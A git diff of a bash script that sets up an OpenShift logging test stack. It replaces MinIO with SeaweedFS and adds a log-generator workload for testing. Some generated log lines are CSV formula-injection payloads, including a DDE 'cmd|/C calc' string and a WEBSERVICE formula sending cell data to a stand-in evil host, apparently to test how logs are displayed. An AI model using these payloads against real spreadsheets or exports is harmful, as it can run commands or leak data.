@@ -1,5 +1,5 @@
 #!/bin/bash
-# Single script: MinIO, chat workload, Cluster Logging + Loki operators, LokiStack,
+# Single script: SeaweedFS, chat workload, Cluster Logging + Loki operators, LokiStack,
 # RBAC, ClusterLogForwarder, Logging UIPlugin. All YAML is embedded below.
 #
 # Env (optional):
@@ -217,88 +217,102 @@ wait_loki_operator_rollout() {
 }
 
 # --- 1. MinIO ---
-echo "Apply MinIO"
+echo "Apply SeaweedFS (S3-compatible object storage)"
 "${OC_KC[@]}" apply -f - <<'EOF'
 apiVersion: v1
 kind: Namespace
 metadata:
-  name: minio
+  name: seaweedfs
 ---
 apiVersion: v1
 kind: Secret
 metadata:
-  name: minio
-  namespace: minio
+  name: seaweedfs-s3
+  namespace: seaweedfs
 stringData:
-  access_key_id: minio
-  access_key_secret: minio123
+  access_key_id: loki-user
+  access_key_secret: loki-secret-key
   bucketnames: loki
-  endpoint: http://minio.minio.svc:9000
+  endpoint: http://seaweedfs.seaweedfs.svc:8333
 type: Opaque
 ---
 apiVersion: v1
 kind: Service
 metadata:
-  name: minio
-  namespace: minio
+  name: seaweedfs
+  namespace: seaweedfs
 spec:
   ports:
-  - port: 9000
+  - name: s3
+    port: 8333
     protocol: TCP
-    targetPort: 9000
+    targetPort: 8333
+  - name: admin
+    port: 9333
+    protocol: TCP
+    targetPort: 9333
   selector:
-    app.kubernetes.io/name: minio
+    app.kubernetes.io/name: seaweedfs
   type: ClusterIP
 ---
 apiVersion: apps/v1
 kind: Deployment
 metadata:
   labels:
-    app.kubernetes.io/name: minio
-  name: minio
-  namespace: minio
+    app.kubernetes.io/name: seaweedfs
+  name: seaweedfs
+  namespace: seaweedfs
 spec:
   selector:
     matchLabels:
-      app.kubernetes.io/name: minio
+      app.kubernetes.io/name: seaweedfs
   strategy:
     type: Recreate
   template:
     metadata:
       labels:
-        app.kubernetes.io/name: minio
+        app.kubernetes.io/name: seaweedfs
     spec:
       containers:
-      - command:
-        - /bin/sh
-        - -c
-        - |
-          mkdir -p /storage/loki && \
-          minio server /storage
+      - name: seaweedfs
+        image: chrislusf/seaweedfs:4.47
+        command:
+        - /usr/bin/weed
+        - server
+        - -s3
+        - -s3.port=8333
+        - -dir=/data
+        - -master.volumeSizeLimitMB=1024
+        - -volume.max=0
         env:
-        - name: MINIO_ACCESS_KEY
-          value: minio
-        - name: MINIO_SECRET_KEY
-          value: minio123
-        image: quay.io/minio/minio
-        name: minio
+        - name: AWS_ACCESS_KEY_ID
+          value: loki-user
+        - name: AWS_SECRET_ACCESS_KEY
+          value: loki-secret-key
         ports:
-        - containerPort: 9000
+        - name: s3
+          containerPort: 8333
+        - name: master
+          containerPort: 9333
+        - name: volume
+          containerPort: 8080
+        - name: filer
+          containerPort: 8888
         volumeMounts:
-        - mountPath: /storage
+        - mountPath: /data
           name: storage
       volumes:
       - name: storage
         persistentVolumeClaim:
-          claimName: minio
+          claimName: seaweedfs
 ---
 apiVersion: v1
 kind: PersistentVolumeClaim
 metadata:
   labels:
-    app.kubernetes.io/name: minio
-  name: minio
-  namespace: minio
+    app.kubernetes.io/name: seaweedfs
+  name: seaweedfs
+  namespace: seaweedfs
 spec:
   accessModes:
   - ReadWriteOnce
@@ -307,8 +321,11 @@ spec:
       storage: 10Gi
 EOF
 
-echo "Wait for MinIO rollout"
-"${OC_KC[@]}" rollout status deployment/minio -n minio --timeout="${ROLLOUT_TIMEOUT}s"
+echo "Wait for SeaweedFS rollout"
+"${OC_KC[@]}" rollout status deployment/seaweedfs -n seaweedfs --timeout="${ROLLOUT_TIMEOUT}s"
+
+echo "Create Loki bucket in SeaweedFS"
+"${OC_KC[@]}" run -n seaweedfs create-bucket --image=amazon/aws-cli:latest --restart=Never --rm -i --env="AWS_ACCESS_KEY_ID=loki-user" --env="AWS_SECRET_ACCESS_KEY=loki-secret-key" --command -- sh -c "aws --endpoint-url=http://seaweedfs.seaweedfs.svc:8333 s3 mb s3://loki || true" || echo "Warning: bucket creation may have failed (continuing)"
 
 # --- 2. Chat log generator ---
 echo "Apply chat workload"
@@ -344,6 +361,120 @@ spec:
 EOF
 "${OC_KC[@]}" wait pod/chat-x -n chat --for=condition=Ready --timeout=180s \
   || echo "Warning: chat pod not Ready yet (continuing; optional workload)."
+
+# --- LOG-9015 numeric sorting test workload ---
+echo "Apply LOG-9015 numeric sorting test workload"
+"${OC_KC[@]}" apply -f - <<'EOF'
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: log-9015-numeric-sorting
+  labels:
+    app.kubernetes.io/name: log-generator
+    app.kubernetes.io/part-of: log-9015
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: log-generator
+  namespace: log-9015-numeric-sorting
+  labels:
+    app.kubernetes.io/name: log-generator
+    app.kubernetes.io/part-of: log-9015
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app.kubernetes.io/name: log-generator
+      app.kubernetes.io/part-of: log-9015
+  template:
+    metadata:
+      labels:
+        app.kubernetes.io/name: log-generator
+        app.kubernetes.io/part-of: log-9015
+    spec:
+      containers:
+        - name: log-generator
+          image: registry.access.redhat.com/ubi9/ubi-minimal
+          imagePullPolicy: IfNotPresent
+          resources:
+            requests:
+              cpu: 10m
+              memory: 32Mi
+            limits:
+              cpu: 50m
+              memory: 64Mi
+          command:
+            - /bin/sh
+            - -c
+            - |
+              LEVELS="critical error warning info debug"
+              pick_level() {
+                set -- $LEVELS
+                shift $((RANDOM % 5))
+                echo "$1"
+              }
+
+              CSV_PAYLOADS='=cmd|/C calc!A0
+              +cmd|/C calc!A0
+              -1+1
+              @SUM(A1:A2)
+              =HYPERLINK("http://evil.example.com","Click")
+              =IMPORTXML("http://evil.example.com","//a")
+              =WEBSERVICE("http://evil.example.com/steal?d="&A1)
+              =1+1
+              +1+1
+              @SUM(A1:A100)'
+
+              pick_csv_payload() {
+                echo "$CSV_PAYLOADS" | sed 's/^[[:space:]]*//' | awk "NR==$((RANDOM % 10 + 1))"
+              }
+
+              burst=0
+              while true; do
+                burst=$((burst + 1))
+                seq=1
+                while [ $seq -le 50 ]; do
+                  level=$(pick_level)
+                  roll=$((RANDOM % 20))
+                  if [ $roll -lt 10 ]; then
+                    printf 'level=%s burst=%04d seq=%03d msg=log-generator-line\n' "$level" "$burst" "$seq"
+                  elif [ $roll -lt 14 ]; then
+                    printf 'level=%s burst=%04d seq=%03d msg=exception-thrown\n' "$level" "$burst" "$seq"
+                    printf 'java.lang.NullPointerException: value was null\n'
+                    printf '  at com.example.service.OrderProcessor.validate(OrderProcessor.java:142)\n'
+                    printf '  at com.example.service.OrderProcessor.process(OrderProcessor.java:87)\n'
+                    printf '  at com.example.api.OrderController.submit(OrderController.java:53)\n'
+                    printf '  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\n'
+                  elif [ $roll -lt 17 ]; then
+                    printf 'level=%s burst=%04d seq=%03d msg=audit-event\n' "$level" "$burst" "$seq"
+                    printf '{\n'
+                    printf '  "event": "user.login",\n'
+                    printf '  "user": "admin@example.com",\n'
+                    printf '  "source_ip": "10.0.%d.%d",\n' "$((RANDOM % 256))" "$((RANDOM % 256))"
+                    printf '  "status": "success",\n'
+                    printf '  "timestamp": "%s"\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+                    printf '}\n'
+                  else
+                    payload=$(pick_csv_payload)
+                    printf 'level=%s burst=%04d seq=%03d msg=csv-injection-test payload=%s\n' "$level" "$burst" "$seq" "$payload"
+                    printf '%s\n' "$payload"
+                    if [ $((RANDOM % 3)) -eq 0 ]; then
+                      printf '\tcalc.exe\n'
+                    fi
+                    if [ $((RANDOM % 3)) -eq 0 ]; then
+                      printf '\rcalc.exe\n'
+                    fi
+                  fi
+                  seq=$((seq + 1))
+                done
+                sleep 2
+              done
+EOF
+
+echo "Wait for LOG-9015 log-generator rollout"
+"${OC_KC[@]}" rollout status deployment/log-generator -n log-9015-numeric-sorting --timeout="${ROLLOUT_TIMEOUT}s" \
+  || echo "Warning: LOG-9015 log-generator deployment not Ready yet (continuing; optional workload)."
 
 # --- 3. Operators: Cluster Logging + Loki subscriptions ---
 repair_orphaned_subscription openshift-logging cluster-logging 'operators.coreos.com/cluster-logging.openshift-logging='
@@ -461,13 +592,13 @@ sed "s|REPLACE|${STORAGE_CLASS_NAME}|g" <<'EOF' | "${OC_KC[@]}" apply -f -
 apiVersion: v1
 kind: Secret
 metadata:
-  name: minio
+  name: seaweedfs-s3
   namespace: openshift-logging
 stringData:
-  access_key_id: minio
-  access_key_secret: minio123
+  access_key_id: loki-user
+  access_key_secret: loki-secret-key
   bucketnames: loki
-  endpoint: http://minio.minio.svc:9000
+  endpoint: http://seaweedfs.seaweedfs.svc:8333
 type: Opaque
 ---
 apiVersion: loki.grafana.com/v1
@@ -482,7 +613,7 @@ spec:
     - version: v12
       effectiveDate: '2022-06-01'
     secret:
-      name: minio
+      name: seaweedfs-s3
       type: s3
   storageClassName: REPLACE
   tenants:
